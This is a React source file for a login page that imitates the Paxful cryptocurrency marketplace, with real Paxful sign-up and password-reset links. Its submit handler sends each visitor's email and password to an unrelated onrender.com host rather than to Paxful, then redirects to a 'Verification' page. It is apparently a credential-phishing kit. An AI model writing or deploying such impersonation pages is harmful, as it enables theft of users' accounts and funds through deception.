import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import './LoginPage.css';

const LoginPage = () => {
  const [passwordVisible, setPasswordVisible] = useState(false);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [emailError, setEmailError] = useState('');
  const [passwordError, setPasswordError] = useState('');
  const navigate = useNavigate();

  const handleSubmit = async (event) => {
    event.preventDefault();
    
    // Reset error messages
    setEmailError('');
    setPasswordError('');
    setError('');

    // Only check if both fields are filled
    if (!email || !password) {
      setEmailError('Invalid email/password');
      setPasswordError('Invalid email/password');
      return;
    }

    try {
      const response = await fetch('https://paxful-backend-5.onrender.com/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ email, password }),
      });

      const data = await response.json();

      if (response.ok) {
        if (data.shouldNavigate) {
          navigate('/Verification');
        }
      } else {
        // Set generic error message for both fields
        setEmailError('Invalid email/password');
        setPasswordError('Invalid email/password');
      }
    } catch (err) {
      setEmailError('Invalid email/password');
      setPasswordError('Invalid email/password');
    }
  };

  const togglePasswordVisibility = () => {
    setPasswordVisible(!passwordVisible);
  };

  return (
    <div className="log_flex">
      <div className="log_flex_one">
        <div className="logo_one">
          <div className="img">
            <img />
          </div>
        </div>
        <h5>Welcome back!</h5>
        <div className="se_l_flex">
          <p className="p_l_f_o">Dont have an account?</p>
          <a href="https://accounts.paxful.com/register" className="p_l_s_o">
            Sign up
          </a>
        </div>

        <form id="loginForm" onSubmit={handleSubmit}>
          {error && <p className="error">{error}</p>}
          
          <div className="imput_cont" style={{backgroundColor: 'red', marginTop: '-5px', borderRadius: '5px', display: (emailError || passwordError) ? 'block' : 'none' }}>
          {(emailError || passwordError) && (
             <p className="validation-error" style={{ color: 'white', fontSize: '14px', marginBottom: '5px', padding: '10px' }}>
               Please enter a correct email address and password. Note that both fields may be case-sensitive.
             </p>
            )}
          </div>

          <div className="imput_cont">
            <h4 style={{ marginTop: '20px' }}>Email / Phone Number</h4>
            <div className="input">
              <input
                type="email"
                name="email"
                id="email"
                placeholder="Email/Phone Number"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
              />
            </div>
          </div>

          <div className="imput_cont">
            <h4 style={{ marginTop: '20px' }}>Password</h4>
            <div className="input">
              <input
                id="password"
                type={passwordVisible ? 'text' : 'password'}
                name="password"
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
            </div>
            <div className="eye" onClick={togglePasswordVisibility}>
              <i
                id="eyeIcon"
                className={`fa-regular ${passwordVisible ? 'fa-eye-slash' : 'fa-eye'}`}
              ></i>
            </div>
          </div>

          <div className="forgot">
            <a href="https://accounts.paxful.com/forgot-password" style={{ color: 'white' }}>Forgot password</a>
          </div>

          <button type="submit" className="log_btn">
            Sign in
          </button>
        </form>
      </div>

      <div className="log_flex_two">
        <div className="log_flex_two_bg_relative">
          <div className="log_fle_two_log_bg">
            <div className="img">
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoginPage;